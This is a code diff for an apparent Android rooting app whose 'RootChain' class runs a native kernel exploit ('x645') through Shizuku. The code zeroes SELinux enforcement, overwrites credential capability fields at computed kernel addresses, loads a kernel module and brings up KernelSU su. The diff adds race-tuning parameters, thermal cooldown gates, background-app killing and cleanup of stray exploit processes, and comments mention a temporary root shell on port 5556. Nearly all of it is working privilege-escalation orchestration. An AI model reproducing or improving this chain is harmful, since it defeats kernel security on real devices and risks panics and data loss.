+      _log('[start] 冷却中（还需 ${startCooldownLeft}s）：连点/连跑只会让设备反复重启升温');
+      return;
+    }
+    _lastStartAt = DateTime.now();
+    _rebootSeenInRun = false;
     running = true;
     _stop = false;
     lastError = null;
@@ -487,13 +971,13 @@ class RootChain extends ChangeNotifier {
     _heartbeat = Timer.periodic(const Duration(seconds: 20), (_) async {
       if (!running) return;
       await ShizukuShell.run(_prepCmd());
-      await refreshHealth();
+      await refreshHealth(force: true);
     });
 
     try {
       bootId = await _bootId();
       await _snapshotOptions();   // 先记录原值，运行结束/成功后可原样恢复
-      await refreshHealth();
+      await refreshHealth(force: true);
       // 探测现状（决定哪些阶段可直接跳过）
       try {
         await detectStatus();
@@ -570,9 +1054,20 @@ class RootChain extends ChangeNotifier {
         phase = '已完成（含跳过）';
       }
       running = false;
+      // ★ 跑完就把选项改过的系统设置还原（v1.0.16 里 restoreOptions 从来没被调用过，
+      //   等于跑完一直留着 30 分钟超时 + 充电保持常亮）。stay_on 优先还原。
+      await restoreOptions();
+      _lastEndAt = DateTime.now();
+      _lastRunFailed = !success;
       _saveStats();
       _advice();
       notifyListeners();
+      if (startCooldownLeft > 0) {
+        _log('[start] 本轮结束：${_lastRunFailed ? (_rebootSeenInRun ? "检测到重启" : "未成功") : "成功"}'
+            '，冷却 ${startCooldownLeft}s 后才能再次点「开始」（别连点：会让设备反复重启升温）');
+      }
+      // 跑完一轮：刷新一次状态（事件驱动的最后一个时机）
+      refreshStatus();
     }
   }
 
@@ -582,17 +1077,21 @@ class RootChain extends ChangeNotifier {
     notifyListeners();
     // 注意：不能用 `pkill -f x645` —— 会匹配到承载它的 `sh -c` 自身，导致后续 pkill 不执行，
     // pc/pc_run 存活并继续占用 perf fd、污染下一轮。用 -x 精确匹配进程名，并拆成多条独立命令。
-    await ShizukuShell.run('pkill -x x645');
-    await ShizukuShell.run('pkill -x pc');
+    await ShizukuShell.run('pkill -9 -x x645 2>/dev/null');
+    await ShizukuShell.run('pkill -9 -x pc 2>/dev/null');
     await ShizukuShell.run('pkill -f "[p]c_run"');
     await ShizukuShell.run('rm -f $workDir/probe.log');
     _log('[stop] 已清理 x645 / pc');
+    await restoreOptions();   // 手动停止也要把常亮/超时等还原
+    notifyListeners();
   }
 
   // ---------------------------------------------------------------- 各阶段
 
   Future<void> _runEnv() async {
     _stage(StageId.env, StageStatus.running, detail: '检查 Shizuku…');
+    // 上次 panic 遗留的设置快照：先把系统设置还原，再开始新一轮
+    await restoreLeftoverOptions();
     phase = '环境检查';
     shizukuOk = await ShizukuShell.checkPermission();
     if (!shizukuOk) {
@@ -606,6 +1105,14 @@ class RootChain extends ChangeNotifier {
       return;
     }
     _log('[env] Shizuku OK, boot_id=$bootId');
+
+    // ---------------- 环境预检：KernelSU 管理器 / su / 目录 ----------------
+    // 为什么放最前面：⑦ 加载模块只要 10s，但 ⑧ 的 su 是**管理器**释放的。
+    // 管理器没装时整条链跑到 ⑧ 才失败（3–6 分钟白跑），所以这里先拦。
+    _stage(StageId.env, StageStatus.running, detail: '预检 KernelSU 管理器…');
+    await _preflight();
+    if (_stop) return;
+
     _stage(StageId.env, StageStatus.running, detail: '部署资产…');
 
     // 755：属主是 shell（可写），其他 App 不可替换（否则任何 App 都能替换 ksupatch/ksu_template 实现提权）
@@ -687,20 +1194,53 @@ class RootChain extends ChangeNotifier {
     }
     _stage(StageId.env, StageStatus.ok,
         detail: '资产已部署 · 内核 ${calib.kernelVersion}（${_kernelSourceText()}）');
+    // 排障基线：版本 / 零写落点 / 设备指纹 / KSU 管理器与 su 现状
+    _log('[diag:env] ver=$kAppVersion params=${optParamSet.name}(PRE_PIPES=$prePipes) '
+        'zero=${calib.selinuxZeroTargetHex} '
+        'alias=${calib.selinuxAliasHex} phys=0x${calib.physBase.toRadixString(16)}');
+    await _diag('env');
     _advice();
   }
 
   /// 自上而下探测设备现状：先从“最终目标”往回判，命中就一路跳过前面的步骤。
   Future<void> detectStatus() async {
+    // 先看有没有上次 panic 遗留的设置快照（有就还原掉，别让用户的超时/常亮一直停在工具值）
+    await restoreLeftoverOptions();
     skipReason.clear();
     alreadyRooted = false;
     final r = await ShizukuShell.run(
+        'KSUV_CACHE="\${ksuAppVersion}"; export KSUV_CACHE; '
         r'echo ENF=$(getenforce 2>/dev/null);'
         r' echo KSU=$(grep -c "^kernelsu" /proc/modules 2>/dev/null || echo 0);'
         r' echo MODS=$(grep -cE "^(pwnm|pwn3|pwnf)" /proc/modules 2>/dev/null || echo 0);'
         r' echo ASSET=$(ls /data/local/tmp/rk/x645 /data/local/tmp/rk/pc /data/local/tmp/rk/ksupatch /data/local/tmp/rk/ml2 2>/dev/null | wc -l);'
         r' echo SUC=$(timeout 4 su -c id -u 2>/dev/null | tr -dc 0-9 | head -c 1);'
-        r' echo UID=$(id -u)');
+        r' echo UID=$(id -u);'
+        // 轻量判断：pm path 比 "pm list packages | grep"（要枚举全部包）快一个量级
+        r' echo KSUAPP=$([ -n "$(pm path me.weishu.kernelsu 2>/dev/null)" ] && echo 1 || echo 0);'
+        r' echo KSUDIR=$(ls -d /data/adb/ksu 2>/dev/null | head -1);'
+        r' echo SUWHICH=$(command -v su 2>/dev/null || ls /data/adb/ksu/bin/su 2>/dev/null || echo);'
+        // dumpsys package 很重（binder + 枚举），只在还没拿到版本时查一次
+        r' echo KSUV=$([ -z "$KSUV_CACHE" ] && dumpsys package me.weishu.kernelsu 2>/dev/null'
+        r' | sed -n "s/.*versionName=//p" | head -1);'
+        r' echo RESET=$(getprop sys.resettype 2>/dev/null);'
+        r' echo LASTB=$(getprop sys.boot.reason.last 2>/dev/null);');
+    // ↓ 供 preflight 与界面使用
+    ksuAppInstalled = (RegExp(r'^KSUAPP=(\d+)', multiLine: true)
+            .firstMatch(r.out)
+            ?.group(1) ?? '0') != '0';
+    ksuDirReady = RegExp(r'^KSUDIR=/', multiLine: true).hasMatch(r.out);
+    suPath = RegExp(r'^SUWHICH=(\S+)', multiLine: true).firstMatch(r.out)?.group(1) ?? '';
+    ksuAppVersion = _normVer(
+        RegExp(r'^KSUV=(\S+)', multiLine: true).firstMatch(r.out)?.group(1) ?? '');
+    lastResetType =
+        RegExp(r'^RESET=(\S+)', multiLine: true).firstMatch(r.out)?.group(1) ?? '';
+    if ((lastResetType.toLowerCase().contains('panic') ||
+            lastResetType.toLowerCase().contains('abnormal')) &&
+        lastResetType != _loggedResetType) {
+      _loggedResetType = lastResetType;
+      _log('[status] 上次重启类型=$lastResetType（kernel panic ⇒ 命中后落地失败，属已知代价）');
+    }
     final m = <String, String>{};
     for (final line in r.out.split('\n')) {
       final i = line.indexOf('=');
@@ -718,10 +1258,14 @@ class RootChain extends ChangeNotifier {
       for (final id in StageId.values) {
         skipReason[id] = '已越狱（su 可用），无需操作';
       }
-      devState = '已越狱 · su 可用 · KSU ${ksu > 0 ? "已加载" : "未加载"}';
+      devState = '已越狱 · su 可用（${suPath.isEmpty ? "PATH" : suPath}）· '
+          'KSU ${ksu > 0 ? "已加载" : "未加载"}';
       phase = '已越狱成功（无需操作）';
-      _log('[status] $devState');
-      _log('[status] 已越狱：全部阶段视为完成');
+      if (devState != _loggedDevState) {
+        _loggedDevState = devState;
+        _log('[status] $devState');
+        _log('[status] 已越狱：全部阶段视为完成');
+      }
       for (final id in StageId.values) {
         _stage(id, StageStatus.skipped, detail: '已越狱（su 可用）');
       }
@@ -769,15 +1313,24 @@ class RootChain extends ChangeNotifier {
       }
     }
 
-    devState = [
-      'SELinux=$enf',
-      if (ksu > 0) 'KSU 已加载' else if (mods > 0) 'root 模块已加载 · KSU 未加载' else 'KSU 未加载',
-      'su 不可用',
-      '资产 $asset/4',
-    ].join(' · ');
-    _log('[status] $devState');
-    if (skipReason.isNotEmpty) {
-      _log('[status] 可跳过：${skipReason.keys.map((k) => k.name).join("、")}');
+    health['E'] = enf;
+    health['G'] = '$mods';
+    health['K'] = '$ksu';
+    health['A'] = '$asset';
+    health['S'] = suc || suPath.isNotEmpty ? '1' : '0';
+    devState = composeDevState();
+    if (devState != _loggedDevState) {
+      _loggedDevState = devState;
+      _log('[status] $devState');
+    }
+    if (ksuAppInstalled && ksuAppVersion.isNotEmpty && ksuAppVersion != kKsuManagerVersion) {
+      _log('[status] ⚠ KernelSU 管理器 v$ksuAppVersion 与本模板内核（v$kKsuManagerVersion）不同；'
+          '若 ⑦⑧ 异常，先换回 v$kKsuManagerVersion 再试');
+    }
+    final skipLine = skipReason.keys.map((k) => k.name).join("、");
+    if (skipLine.isNotEmpty && skipLine != _loggedSkip) {
+      _loggedSkip = skipLine;
+      _log('[status] 可跳过：$skipLine');
     }
     notifyListeners();
   }
@@ -836,6 +1389,7 @@ class RootChain extends ChangeNotifier {
     final s = _byId[StageId.permissive]!;
     _stage(StageId.permissive, StageStatus.running);
     phase = 'permissive';
+    await _killStrays(withPc: true);
     for (var run = 0; run < 4 && !_stop; run++) {
       s.runs++;
       await ShizukuShell.run(_prepCmd());
@@ -846,8 +1400,22 @@ class RootChain extends ChangeNotifier {
           'P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 P645_V8=1 '
           'P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
           'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
-          'P645_THRESH=32 P645_RING_GO=0 P645_FORCE_LEFT=${calib.selinuxZeroTargetHex} P645_LOG=$logPath';
-      _log('[permissive] run ${run + 1}: 开打（约 30–60s）');
+          'P645_THRESH=32 P645_RING_GO=0 P645_FORCE_LEFT=${calib.selinuxZeroTargetHex} '
+          // PRE_PIPES 决定 uid 2000 的 64MB 管道预算用得早不早：
+          // 20000 会把预算占满 ⇒ 后面 PIPE512=64 的 512KB 管道必然 EPERM（实测 errno=1）。
+          'P645_PRE_PIPES=$prePipes P645_LOG=$logPath';
+      // 温度闸 + 环境探针
+      await _cooldownGate();
+      if (!await _ensureAwake()) {
+        _log('[wake] 屏幕唤不醒，放弃本轮（doze 状态下打必亏）');
+        _stop = true;
+        return;
+      }
+      await _killBackground('permissive');
+      await _envProbe('permissive');
+      await _shotMeta('permissive');
+      _log('[permissive] run ${run + 1}: 开打（约 30–60s）'
+          ' 参数集=${optParamSet.name}（PRE_PIPES=$prePipes）');
       final r = await ShizukuShell.run(
         'cd $workDir && chmod 755 x645 && $env ./x645 2>&1; echo "RC=\$?"',
         timeoutMs: 300000,
@@ -884,8 +1452,8 @@ class RootChain extends ChangeNotifier {
     }
     _log('[clean] 清理残留：停 root shell / 删原生件与临时文件…');
     // ① 停掉 5556 root shell 服务（候选进程会 fork 一个常驻服务）
-    await ShizukuShell.run('pkill -x pc');
-    await ShizukuShell.run('pkill -x x645');
+    await ShizukuShell.run('pkill -9 -x pc 2>/dev/null');
+    await ShizukuShell.run('pkill -9 -x x645 2>/dev/null');
     // ② 删临时产物（保留 workDir 下的日志到清理前先不删，便于排查）
     final r = await ShizukuShell.run(
       'rm -f /tmp/ksyms.txt /tmp/kt*.ko /data/local/tmp/kt*.ko '
@@ -918,34 +1486,141 @@ class RootChain extends ChangeNotifier {
   }
 
   /// 设备健康 / slab 检查（温度、唤醒、内存、posix_timers_cache、cred_jar、SELinux）
-  Future<void> refreshHealth() async {
+  Future<void> refreshHealth({bool force = false}) async {
+    // 跑链期间一律不读（slabinfo/dumpsys 都会干扰竞态）；只有显式 force 的一次性调用例外
+    if (running && !force) return;
+    // 温度直读（一次性刷新时也要有值，不能等 2s 定时器）
+    final dip = readTempMc();
+    if (dip > 0) health['T'] = '$dip';
     final r = await ShizukuShell.run(
-        'echo "T=\$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null)";'
+        // 温度走直读（readTempMc），这里不再读
         'echo "W=\$(dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2)";'
-        'echo "M=\$(free -m 2>/dev/null | awk \'/Mem:/{print \$3\"/\"\$2}\')";'
+        // 内存显示改成「可用/总」（原来 free 的 $3/$2 是已用/总，14858/15011 看着像要爆）
+        // 内存显示「可用/总」，按 GB 取整（原来是 free 的已用/总，看着像要爆）
+        'echo "M=\$(( \$(grep -m1 MemAvailable /proc/meminfo | tr -s " " | cut -d" " -f2) / 1048576 ))G/\$(( \$(grep -m1 MemTotal /proc/meminfo | tr -s " " | cut -d" " -f2) / 1048576 ))G";'
         'echo "P=\$(grep -m1 posix_timers_cache /proc/slabinfo 2>/dev/null | awk \'{print \$2\"/\"\$3}\')";'
         'echo "C=\$(grep -m1 \"^cred_jar\" /proc/slabinfo 2>/dev/null | awk \'{print \$2\"/\"\$3}\')";'
-        'echo "E=\$(getenforce 2>/dev/null)"');
+        'echo "E=\$(getenforce 2>/dev/null)"'
+        '; echo "G=\$(grep -cE \"^pwn\" /proc/modules 2>/dev/null || echo 0)"'
+        '; echo "K=\$(grep -c \"^kernelsu\" /proc/modules 2>/dev/null || echo 0)"'
+        '; echo "A=\$(ls /data/local/tmp/rk/x645 /data/local/tmp/rk/pc /data/local/tmp/rk/ksupatch /data/local/tmp/rk/ml2 2>/dev/null | wc -l)"'
+        '; echo "S=\$(command -v su >/dev/null 2>&1 && echo 1 || ([ -x /data/adb/ksud ] && echo 1) || echo 0)"');
+    var changed = false;
     for (final line in r.out.split('\n')) {
       final i = line.indexOf('=');
       if (i <= 0) continue;
       final k = line.substring(0, i).trim();
       final v = line.substring(i + 1).trim();
-      if (k == 'T' || k == 'W' || k == 'M' || k == 'P' || k == 'C' || k == 'E') {
-        health[k] = v;
+      if (k == 'T' || k == 'W' || k == 'M' || k == 'P' || k == 'C' || k == 'E' ||
+          k == 'G' || k == 'K' || k == 'A' || k == 'S') {
+        if (health[k] != v) {
+          health[k] = v;
+          changed = true;
+        }
       }
     }
     if (r.via.isNotEmpty && shizukuVia != r.via) {
       shizukuVia = r.via;
       _log('[env] Shizuku 接口: ${r.via == 'api' ? 'Shizuku.newProcess' : 'AIDL newProcess'}');
+      changed = true;
     }
-    notifyListeners();
+    // 拿到数据说明 Shizuku 通了 ⇒ 打开 App 后就能开始轮询（之前只有 start() 里才置位）
+    if (r.via.isNotEmpty && !shizukuOk) shizukuOk = true;
+    // 「现状」那行也跟着 5s 刷新（和温度同一节奏）
+    if (health['E'] != null) {
+      final ds = composeDevState();
+      if (ds != devState) {
+        devState = ds;
+        changed = true;
+      }
+    }
+    // 每 5s 轮询时值通常不变，没必要刷新整屏
+    if (changed) notifyListeners();
+  }
+
+  /// 「现状」那一行的文字（detectStatus 与 5s 轮询共用）
+  ///
+  /// 只依赖 health 里的轻量字段（E/G/K/A/S）与探测到的管理器信息，
+  /// 所以可以每 5 秒算一次，不会像 pm list packages 那样重。
+  String composeDevState() {
+    final enf = (health['E'] ?? '').trim();
+    final pwn = int.tryParse((health['G'] ?? '0').trim()) ?? 0;
+    final ksu = int.tryParse((health['K'] ?? '0').trim()) ?? 0;
+    final asset = int.tryParse((health['A'] ?? '0').trim()) ?? 0;
+    final hasSu = (health['S'] ?? '0').trim() == '1';
+    final ksuAppText = ksuAppInstalled
+        ? 'KSU 管理器 ${ksuAppVersion.isEmpty ? "已装" : "v$ksuAppVersion"}'
+        : 'KSU 管理器 未装';
+    return [
+      if (enf.isEmpty) 'SELinux=?' else 'SELinux=$enf',
+      if (ksu > 0) 'KSU 已加载' else if (pwn > 0) 'root 模块已加载 · KSU 未加载' else 'KSU 未加载',
+      ksuAppText,
+      hasSu ? 'su 可用${suPath.isEmpty ? "" : "（$suPath）"}' : 'su 不可用',
+      '资产 $asset/4',
+      if (lastResetType.toLowerCase().contains('panic')) '上次=panic 重启',
+    ].join(' · ');
+  }
+
+  /// 一次性刷新（重）：健康条 + detectStatus
+  ///
+  /// 触发时机：打开 App、Shizuku 授权成功、切回前台、跑完一轮后。
+  /// **跑链期间直接 return** —— 运行时的检测逻辑回到 v1.0.16（不做 detectStatus / slabinfo），
+  /// 因为 v1.0.17 曾用 3s/5s 定时器在竞态窗口里跑这些重活，把 panic 率从 12% 推到 100%。
+  Future<void> refreshStatus({bool withDetect = true}) async {
+    if (running) return;          // 跑链期间一律不探测
+    await refreshHealth(force: true);
+    if (withDetect) {
+      try {
+        await detectStatus();
+      } catch (_) {}
+    }
+  }
+
+  /// 空闲期：每 5 秒刷新状态；**跑链期间完全不刷**（运行时的行为回到 v1.0.16：
+  /// 只有开打前的一次温度闸 + 20s 心跳的 prep，不做 detectStatus/slabinfo 这类重活）。
+  void startHealthPolling() {
+    _healthTimer?.cancel();
+    refreshStatus(); // 先立刻刷一次
+    var tick = 0;
+    // 频率照参考实现：**2 秒一拍**；温度直读文件（零开销），
+    // 每 5 拍（10 秒）才走一次 shell 读 slab/内存/唤醒/SELinux。
+    _healthTimer = Timer.periodic(const Duration(seconds: 2), (_) async {
+      if (running) return;               // 跑链期间完全暂停读取（参考实现也是"已暂停读取"）
+      tick++;
+      // 每拍：温度直读
+      final t = readTempMc();
+      if (t > 0 && health['T'] != '$t') {
+        health['T'] = '$t';
+        notifyListeners();
+      }
+      if (tick % 5 != 0) return;         // 10s 才做一次重活
+      if (_healthBusy) return;
+      _healthBusy = true;
+      try {
+        if (!shizukuOk) {
+          final ok = await ShizukuShell.checkPermission();
+          if (!ok) return;
+          shizukuOk = true;
+          _log('[health] Shizuku 已授权，开始每 2s 读温度 / 每 10s 读 slab');
+        }
+        await refreshHealth();           // shell 部分（slab/内存/唤醒/SELinux/模块/su/资产）
+      } catch (_) {
+      } finally {
+        _healthBusy = false;
+      }
+    });
+  }
+
+  void stopHealthPolling() {
+    _healthTimer?.cancel();
+    _healthTimer = null;
   }
 
   Future<bool> _rebooted() async {
     final b = await _bootId();
     if (b.isNotEmpty && bootId.isNotEmpty && b != bootId) {
       bootId = b;
+      _rebootSeenInRun = true;   // 本轮遇到过重启 ⇒ 冷却时间加倍（180s）
       return true;
     }
     return false;
@@ -957,7 +1632,7 @@ class RootChain extends ChangeNotifier {
     for (var run = 0; run < 3 && !_stop; run++) {
       final r = await ShizukuShell.run(
           'cd $workDir && rm -f probe.log && chmod 755 pc module.ko && '
-          'pkill -x pc 2>/dev/null; '
+          'pkill -9 -x pc 2>/dev/null; '
           'nohup setsid ./pc ${calib.tracepointId} 14 $workDir/module.ko > $workDir/probe.log 2>&1 < /dev/null & echo started');
       _log('[probe] ${r.all}');
       await _sleep(6000);
@@ -1010,22 +1685,25 @@ class RootChain extends ChangeNotifier {
         'P645_REPEATS=520 P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 '
         'P645_V8=1 P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
         'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
-        'P645_THRESH=32 P645_RING_GO=0 P645_LOG=$logPath';
+        'P645_THRESH=32 P645_RING_GO=0 P645_PRE_PIPES=$prePipes P645_LOG=$logPath';
     if (tryList != null && tryList.isNotEmpty) {
       env += " P645_TRY_LIST='$tryList'";
     }
     await ShizukuShell.run(_prepCmd());
-    await ShizukuShell.run('pkill -x x645'); // 清掉上一发可能残留的孤儿，避免两份并发污染判据
-    _log('[${stage.name}] 开打 tries=$tries');
+    await ShizukuShell.run('pkill -9 -x x645 2>/dev/null'); // 清掉上一发可能残留的孤儿，避免两份并发污染判据
+    await _shotMeta(stage.name);
+    _log('[${stage.name}] 开打 tries=$tries 参数集=${optParamSet.name}'
+        '（PRE_PIPES=$prePipes PIPE512=64 PIPE_K=4 THRESH=32）');
     final r = await ShizukuShell.run(
       'cd $workDir && $env ./x645 2>&1; echo "RC=\$?"',
       timeoutMs: timeoutMs,
     );
     if (r.all.isNotEmpty) _log(r.all);
-    if (r.code == -9) {
-      _log('[${stage.name}] 超时，清理残留 x645');
-      await ShizukuShell.run('pkill -x x645');
-    }
+    // ★ 每发打完都用 -9 清一遍：载荷的 exec 竞速会留下大量同名子进程，
+    // 原来的 `pkill -x x645`（SIGTERM）杀不掉它们，实测会累积到 300 个，
+    // 把整机 load 顶到 300+、空闲温度从 32°C 抬到 51°C、管道页预算占满，
+    // 之后每一发都在"热机 + 预算耗尽"的条件下开打，命中率断崖下跌。
+    await _killStrays();
     final lg = await ShizukuShell.run('cat $logPath 2>/dev/null');
     return lg.out;
   }
@@ -1040,11 +1718,24 @@ class RootChain extends ChangeNotifier {
         _stage(StageId.phase1, StageStatus.failed, detail: '候选消失');
         return;
       }
-      final targets =
-        creds
-            .take(8)
-            .map((c) => _hex(c + BigInt.from(calib.offCapBset)))
-            .join(',');
+      // 只取前 8 个候选、内层 8 次（= v1.0.16 行为）。
+      // 实测（2026-10-27）：扩大到 14 个候选 + tries=14 无收益（3 发全 miss），
+      // 反而把单发从 3.5 分钟拉长到 6 分钟 ⇒ 保持 8/8。
+      final targets = creds
+          .take(8)
+          .map((c) => _hex(c + BigInt.from(calib.offCapBset)))
+          .join(',');
+      // P1/P2 用宽松闸：实测（2026-10-27 真机 5 轮）P1/P2 在 37–42°C 都是 try=1，
+      // 没有必要按用户档位长等；只挡 >48°C 的真正过热。
+      await _cooldownGate(relaxed: true);
+      if (_stop) return;
+      if (!await _ensureAwake()) {
+        _log('[wake] 屏幕唤不醒，放弃本轮（doze 状态下打必亏）');
+        _stop = true;
+        return;
+      }
+      await _killBackground('phase1');
+      await _envProbe('phase1');
       final lg = await _runShot(
         stage: StageId.phase1,
         stageFrom: 1,
@@ -1093,9 +1784,22 @@ class RootChain extends ChangeNotifier {
         cred = _hex(creds.first);
       }
       final c = _fromHex(cred);
+      // 与 v1.0.16 相同：同一个 cred 的 (cap_permitted → cap_effective) 重复三次。
+      // 实测（2026-10-27）：换成多个不同 cred、或把写入值改成 0x10000，均未证明更好
+      // （见 issue #5 的未验证清单）⇒ 这里保持原样，改动一律先验证再上。
       final p = _hex(c + BigInt.from(calib.offCapPermitted));
       final ch = _hex(c + BigInt.from(calib.offCapEffective));
       final list = '3:$p:$ch,3:$p:$ch,3:$p:$ch';
+      // 同上：P2 也用宽松闸
+      await _cooldownGate(relaxed: true);
+      if (_stop) return;
+      if (!await _ensureAwake()) {
+        _log('[wake] 屏幕唤不醒，放弃本轮（doze 状态下打必亏）');
+        _stop = true;
+        return;
+      }
+      await _killBackground('phase2');
+      await _envProbe('phase2');
       final lg = await _runShot(
         stage: StageId.phase2,
         stageFrom: 1,
@@ -1145,6 +1849,10 @@ class RootChain extends ChangeNotifier {
     final v = await _pollVerdict('ROOT_OK', 90);
     if (v != null) {
       _stage(StageId.root, StageStatus.ok, detail: v.split('\n').last);
+      // 有 root 了：核对内核镜像 + 看 dmesg 里 KSU/模块的落地情况
+      await _diagRoot('root');
+      // 顺手把「上次为什么重启」也抓下来（pstore/ramoops 只有 root 能读）
+      await collectLastCrash();
       _advice();
       return;
     }
@@ -1155,6 +1863,460 @@ class RootChain extends ChangeNotifier {
     _stage(StageId.root, StageStatus.failed, detail: '模块未加载');
     lastError = '模块未加载（看日志 FINIT errno）';
     _advice();
+  }
+
+  /// su 现在能不能用（KernelSU 的 su 是"虚拟"的：文件不存在也能被内核劫持）
+  /// KernelSU 版本号规范化
+  ///
+  /// 坑：Honor 的 `dumpsys package` 输出 `versionName=v3.3.1`（自带 v 前缀），
+  /// 直接拼 " v$ver" 就成了 `vv3.3.1`，还会让版本比较假报警。
+  static String _normVer(String raw) {
+    final m = RegExp(r'[vV]?(\d+(?:\.\d+)+)').firstMatch(raw.trim());
+    return m?.group(1) ?? raw.trim();
+  }
+
+  // ------------------------------------------------------------------ 温度直读
+  //
+  // `/sys/class/thermal/thermal_zone0/temp` 是 `-r--r--r--`（0444），**普通 App 直接读就行**，
+  // 不需要 shell/Shizuku。所以高频采样（2s）不会带来任何进程开销；
+  // 参考实现的监控线程也是 2 秒一采样，但它是每条命令都走 shell，我们这里省掉这一步。
+
+  static const String _tempPath = '/sys/class/thermal/thermal_zone0/temp';
+  static const String _tempTypePath = '/sys/class/thermal/thermal_zone0/type';
+
+  /// 读 CPU 温度（m℃）；失败/异常值返回 0
+  static int readTempMc() {
+    try {
+      final raw = File(_tempPath).readAsStringSync().trim();
+      final v = int.tryParse(raw) ?? 0;
+      // 范围校验：只认 10–120°C，其余当坏值（瞬时抖动/读文件撞上更新）
+      if (v <= 10000 || v >= 120000) return 0;
+      return v;
+    } catch (_) {
+      return 0;
+    }
+  }
+
+  static String readTempZoneName() {
+    try {
+      final t = File(_tempTypePath).readAsStringSync().trim();
+      return t.isEmpty ? 'zone0' : t;
+    } catch (_) {
+      return 'zone0';
+    }
+  }
+
+  /// 清理上一轮残留的原生进程。
+  ///
+  /// **必须做**：载荷的 exec 竞速会 fork 出大量同名进程（实测量到过 300 个 x645 常驻），
+  /// 父进程被结束/超时杀掉后这些子进程仍然活着——每个都握着 54000 个定时器和一堆管道页。
+  /// 后果：整机 load 飙到 300+、空闲温度从 32°C 升到 51°C、管道预算被占满，
+  /// 于是后面每一发都在"热机 + 预算耗尽"的条件下开打，命中率断崖式下跌。
+  /// [withPc] 只有「链开始前 / 链结束后」才能连 `pc` 一起清。
+  /// **每发结束后绝对不能杀 pc**：它是判据生产者（CAPBND_ZERO / CAPEFF_OK / ROOT_OK 都由它打印）
+  /// 兼模块加载者，杀了它 ⇒ 即使写成功也拿不到 verdict（真机实测：P1 明明
+  /// `stage_done st=1 leak=0x… tgt=…` 命中候选，probe.log 却只剩一行 `Killed` ⇒ 全被记成 miss）。
+  Future<void> _killStrays({bool withPc = false}) async {
+    final r = await ShizukuShell.run(
+        'N1=\$(pgrep -x x645 | wc -l); N2=\$(pgrep -x pc | wc -l); '
+        'pkill -9 -x x645 2>/dev/null; '
+        '${withPc ? 'pkill -9 -x pc 2>/dev/null; ' : ''}'
+        'sleep 1; echo "\$N1 \$N2 \$(pgrep -x x645 | wc -l)"');
+    final t = r.out.trim().split(RegExp(r'\s+'));
+    if (t.length >= 3) {
+      final before = int.tryParse(t[0]) ?? 0;
+      final pcN = int.tryParse(t[1]) ?? 0;
+      if (before > 0 || pcN > 0) {
+        _log('[clean] 清掉残留进程：x645=$before pc=$pcN ⇒ 现在剩 ${t[2]} 个');
+      }
+    }
+  }
+
+  /// 开打前清理后台（默认关闭；开关在「选项」里）
+  ///
+  /// **只清理第三方 App 的后台进程，绝不碰系统/供应商服务。**
+  /// 实现要点（踩过的坑）：
+  /// - 不用 `am kill-all`：它会连系统里的后台服务一起杀（用户实测被杀后相机/蓝牙等服务异常）。
+  /// - 不用 `pm list packages` 之外的白名单：取 `pm list packages -3`（第三方）与当前在跑的进程名求交集，
+  ///   再用 `am kill <pkg>`（只杀**可安全杀**的后台进程，前台不动）。
+  /// - 进程名必须用 `ps -A -o args`（完整 cmdline）；`-o NAME` 会被截断到 15 字符，
+  ///   长包名（com.tencent.mobileqq）根本匹配不上。
+  /// - 显式跳过：本 App 自己、Shizuku、KernelSU 管理器（杀了会断掉自己的通道）。
+  Future<void> _killBackground(String tag) async {
+    if (!optKillBg) return;
+    // 三件事分开做，全部在 Dart 侧求交集：
+    // ① 取第三方包清单；② 取当前在跑的进程名（ps -A -o args，完整 cmdline）；
+    // ③ 只对交集里的包下发 am kill。
+    // 不在 shell 里写 while/for + here-doc：Shizuku 通道一次只跑一条命令，
+    // here-doc 正文必须另起一行 ⇒ 之前真机上恒定输出「0 个」。
+    final before = await ShizukuShell.run('ls /proc 2>/dev/null | grep -cE "^[0-9]"');
+    final n0 = int.tryParse(before.out.trim()) ?? 0;
+    final tpR = await ShizukuShell.run('pm list packages -3 2>/dev/null');
+    final third = <String>{};
+    for (final l in tpR.out.split('\n')) {
+      final t = l.trim();
+      if (t.startsWith('package:')) third.add(t.substring(8));
+    }
+    final psR = await ShizukuShell.run('ps -A -o args 2>/dev/null');
+    final running = <String>{};
+    for (final l in psR.out.split('\n')) {
+      final t = l.trim();
+      if (t.isEmpty) continue;
+      var name = t;
+      final sp = name.indexOf(RegExp(r'[ :]'));
+      if (sp > 0) name = name.substring(0, sp);
+      running.add(name);
+    }
+    const skip = <String>{
+      'moe.shizuku.privileged.api',
+      'me.weishu.kernelsu',
+    };
+    final targets = running
+        .where((p) => third.contains(p))
+        .where((p) => !p.startsWith('com.noworld.rootkit'))
+        .where((p) => !skip.contains(p))
+        .toList()
+      ..sort();
+    if (targets.isEmpty) {
+      _log('[killbg:$tag] 没有需要清理的第三方后台'
+          '（第三方包=${third.length} 进程=${running.length} rc=${tpR.code}/${psR.code}）');
+      return;
+    }
+    final cmd = targets.map((p) => 'am kill ${_shq(p)} >/dev/null 2>&1').join('; ');
+    await ShizukuShell.run(cmd);
+    await _sleep(1200);
+    final after = await ShizukuShell.run('ls /proc 2>/dev/null | grep -cE "^[0-9]"');
+    final n1 = int.tryParse(after.out.trim()) ?? 0;
+    _log('[killbg:$tag] 已清理第三方后台 ${targets.length} 个'
+        '（${targets.join(",")}）${(n0 > 0 && n1 > 0) ? " · 进程 $n0 → $n1" : ""}');
+    if (!await ShizukuShell.checkPermission()) {
+      _log('[killbg:$tag] ⚠ Shizuku 掉线：请重新授权后再跑');
+    }
+  }
+
+  /// 开打前的环境探针（用来回答"是不是后台 App 干扰"这类问题）
+  ///
+  /// 每发之前打一行 `[envprobe]`，把**会直接影响竞态/落位/回收**的现场量记下来：
+  /// · 唤醒态（Dozing/Sleep 时命中率会崩，AGENTS 里有硬数据）
+  /// · 内存（MemAvailable / Dirty / SwapFree）—— 页回收竞争的强弱
